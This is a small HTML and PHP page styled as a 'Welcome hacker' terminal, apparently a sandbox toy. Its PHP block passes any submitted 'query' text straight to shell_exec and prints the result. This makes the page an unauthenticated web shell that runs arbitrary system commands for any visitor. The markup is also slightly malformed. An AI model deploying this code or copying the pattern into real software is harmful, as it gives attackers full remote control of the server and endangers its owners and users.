<html>

<head>
    <meta charset="UTF-8">
    <title>Sandlådan</title>
    <style>
            body { font-family: Courier; background-color: black; } 
            h1 { color: #00FF00; }
            button { color: #0000FF; }
            h2 {
                color: #00FF00;
                white-space: nowrap;
                overflow: hidden;
                font-size: 2em;
            }
            form {
                color: #00FF00;
            }
            ::placeholder {
                color: #00FF00;
                opacity: 1;
            }
            input {
                background-color:#000000;
                color:#00ff00;
            }
            input:hover, input:focus {
                outline: none !important;
                border: none !important;
                box-shadow: 0 0 0px 0px black !important;
            }
            @keyframes typing {
                from {
                    width: 0
                }
            }
                
            @keyframes blink {
                50% {
                    border-color: transparent
                }
            }
    </style>
    <script src="/script.js"></script>
</head>
<body id="b">
    <h2>- Welcome hacker -</h2>
    <form method="post">
        $ <input type="text" name="query" placeholder="">
        <input type="submit" hidden />
    </from></h2>
</body>

</html>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    echo "->" . shell_exec($_POST['query']);
}
?>